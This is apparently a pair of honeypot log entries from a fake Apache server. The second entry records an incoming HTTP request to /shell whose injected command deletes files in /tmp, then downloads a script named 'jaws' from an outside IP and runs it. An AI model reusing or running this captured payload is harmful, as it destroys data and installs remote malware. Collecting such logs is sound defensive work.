{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-08T04:38:10.610553","parsedMessage":{"timestamp":"2023-03-08 04:38:10.610553","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 182.227.11.91:48168 to port 80","ip":"182.227.11.91"},"id":"337b418f-850b-4cae-9f70-e5103d840878","EventProcessedUtcTime":"2023-03-08T04:38:11.0146972Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-08T04:38:10.7890000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/182.227.11.91"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Wed Mar  8 04:39:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-08 04:38:10+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"182.227.11.91 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"182.227.11.91"},"id":"aac7862c-c6e7-46cb-a597-05f370417e23","EventProcessedUtcTime":"2023-03-08T04:39:02.2022276Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-08T04:39:02.0460000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/182.227.11.91"}